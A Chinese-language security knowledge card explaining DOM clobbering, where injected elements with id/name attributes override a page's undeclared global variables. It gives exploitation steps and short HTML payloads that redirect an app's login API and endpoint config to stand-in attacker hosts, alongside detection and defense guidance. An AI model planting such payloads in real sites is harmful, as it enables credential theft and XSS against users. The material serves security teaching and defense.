---
id: web-generic-xss-dom-clobbering-window-name-collision
title: DOM Clobbering：用 id/name 元素覆盖未声明的全局变量
type: scenario
domain: web
path: web/generic/xss
technique: dom-clobbering-named-property
aliases:
- DOM Clobbering
- 变量劫持
- window 命名属性覆盖
- HTML 元素覆盖全局变量
- dom clobbering xss
tags:
- web
- xss
- dom-clobbering
- dom
- html-injection
- named-property
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V9
  verified_at: '2026-11-05T01:03:19+08:00'
  notes: 原文无图片，已通读全文并核对浏览器命名属性行为。卡中命名属性/二级 form 访问、变量声明遮蔽等描述正确；原文“元素可被当函数调用并执行 href”“直接 fetch 元素即取 value”两处链不成立，卡已明确标注并只保留可成立原语，最终危害依赖应用实际读取 .value/.href 的 sink，原文未给出可运行的端到端案例。原文未涉及版本区间。未执行任何 PoC。
---

## 一句话结论

浏览器会把带 `id` 的元素（以及部分带 `name` 的元素）暴露成 `window` 的命名属性；当页面 JavaScript 使用一个未声明的全局变量、或直接读 `window.X` 时，攻击者注入的 `<form id="X">`/`<a id="X">` 就能顶替该变量，篡改配置、URL 或布尔开关，常见于绕过前端过滤进而触发 DOM XSS 或数据外泄。

## 原理

- HTML 规范定义了 Window/Document 的“命名属性”（named properties）：文档中带 `id` 的元素会以该 id 出现在 `window` 和 `document` 的属性访问中；带 `name` 的 `a`、`form`、`img`、`iframe`、`object`、`embed` 等元素也会参与命名访问。
- 命名属性只在该名字没有“自有属性”时生效。因此，顶层 `var foo` 或 `window.foo = ...` 会遮住同名的 DOM 元素；而 `let`/`const` 在模块或脚本作用域内形成词法绑定，也不会被 `window.foo` 元素覆盖。真正可利用的是“没有声明、直接赋值”的全局（sloppy mode 下 `foo = {...}` 创建 window 属性）或代码显式读取 `window.foo`。
- 表单提供了二级命名访问：`<form id="config"><input name="url" value="...">` 会让 `window.config` 是 form 元素，`window.config.url` 通过 HTMLFormElement 的命名 getter 返回该 input 元素。若应用读 `config.url.value`，就拿到了攻击者控制的字符串；若应用把 `config.url` 直接当字符串用，得到的是元素而非 value，利用是否成立取决于具体 sink。
- 锚点/图片的常用形态：`<a id="x" href="https://attacker/">` 让 `window.x.href` 是可控 URL；`<img name="x" src="...">` 让 `window.x.src` 可控。两级 clobbering 可用同名 id 的集合：`<a id="x"></a><a id="x" name="y" href="...">` 使 `window.x` 成为 HTMLCollection，`window.x.y` 取到第二个锚点。
- 常见落点：应用用全局配置决定请求地址/调试开关/校验函数是否存在；前端 sanitizer 依赖全局配置；代码用 `if (window.trustedConfig)` 之类判断。DOM Clobbering 不执行脚本，HTML 里没有 `<script>` 或事件处理器，因此能绕过只查脚本特征、却允许 `id`/`name` 属性的过滤器。
- 重要边界：DOM 元素不是函数。把 `window.checkComment` 覆盖成 `<a>` 后再调用 `checkComment()`，浏览器会抛 `TypeError: checkComment is not a function`，不会执行 `href` 里的 `javascript:`。网上常见的“函数劫持后调用即执行 href”说法不成立；本卡只描述命名属性覆盖本身。

## 触发条件

- 存在 HTML 注入点（存储型/反射型均可），过滤器允许 `id`、`name`、`form` 等属性，或只拦截 `<script>`/事件处理器。
- 页面脚本使用未声明的全局变量，或显式读取 `window.<名字>`，且该名字可被注入元素占用。
- 被覆盖的值最终进入有实际影响的 sink：读取 `.value`/`.href`/`.src`、布尔判断、拼接 URL、作为配置传给 fetch/跳转等。
- 注入的 HTML 在目标脚本执行前或执行时已进入 DOM（存储型最稳）。

## 利用步骤

1. 审计页面脚本，找未声明全局变量或 `window.X` 读取，例如 `apiConfig = {...}`、`if (window.debug)`、`fetch(config.url)`。
2. 确认 HTML 注入点允许 `id`/`name`/`form` 属性，且不会被 DOMPurify 等移除。
3. 注入同名元素：配置对象用 form+input，URL 用 a/img，布尔开关用任意带 id 的元素。
4. 在控制台验证 `window.X`/`X.Y` 是否返回注入元素。
5. 触发业务逻辑，观察被覆盖值是否进入 sink；若 sink 需要字符串，补齐 `.value`/`.href` 的读取路径或选择对应元素类型。

## PoC

覆盖全局配置对象（应用读 `apiConfig.loginApi.value`）：

```html
<form id="apiConfig">
  <input name="loginApi" value="https://attacker.example/stealLogin">
  <input name="debugMode" value="true">
</form>
```

此时：

```javascript
window.apiConfig            // <form id="apiConfig">
window.apiConfig.loginApi   // <input name="loginApi" ...>
window.apiConfig.loginApi.value // "https://attacker.example/stealLogin"
```

覆盖 URL 型全局（应用读 `config.endpoint.href` 或 `String(...)` 前先取 `.href`）：

```html
<a id="config"></a>
<a id="config" name="endpoint" href="https://attacker.example/x"></a>
```

覆盖布尔开关（元素对象为 truthy）：

```html
<form id="debugMode"></form>
```

验证脚本：

```javascript
console.log(window.apiConfig);          // form 元素
console.log(window.apiConfig.loginApi.value);
```

注意：直接 `fetch(window.apiConfig.loginApi)` 会把元素转成字符串而不是取 value，实际利用必须匹配应用读取属性的方式。

## 变体与关联

- 元素类型变体：form+input（二级属性）、a[href]、img[src]、iframe[name]、object/embed；同名 id 的 HTMLCollection 可做两级命名访问。
- 目标变体：全局配置对象、API 基址、调试/角色开关、sanitizer 配置、`window` 上挂载的 SDK 配置。
- 组合变体：DOM Clobbering 常作为“绕过前端过滤器/改变 sanitizer 行为”的前置步骤，再配合 mXSS 或 DOM XSS sink 完成执行；也可用于把凭据请求导向攻击者域名。
- 关联：[[web-generic-xss-scriptless-execution-vectors]]（无 script 标签的 XSS 载体）；[[web-generic-xss-filter-bypass-encoding-obfuscation]]（过滤绕过思路）；[[web-generic-xss-data-iframe-postmessage-innerhtml]]（DOM XSS 的另一个入口）。
- 边界：全局变量用 `const`/`let`/`var` 正确声明、配置被 `Object.freeze`/`defineProperty` 保护、DOMPurify 禁止 `id`/`name`/`form` 属性、或 sink 不读取元素属性时，本手法不成立。

## 检测与防御

- 检测：页面出现来源不可信的 `id`/`name` 属性；`window` 上的关键配置名被 DOM 元素占用；控制台出现“配置对象变成 HTMLFormElement/HTMLAnchorElement”的异常类型；前端监控可对比全局变量类型变化。
- 防御：所有变量用 `const`/`let` 声明，禁止隐式全局（ESLint `no-undef`、`no-global-assign`）；配置对象放模块作用域并 `Object.freeze`，必要时用 `Object.defineProperty(window, name, {value, writable:false, configurable:false})`；HTML 净化使用 DOMPurify 并 `FORBID_ATTR: ['id','name','form']`；使用 CSP 与 Trusted Types 降低 XSS 影响，但不要把 CSP 当作 DOM Clobbering 的修复手段。
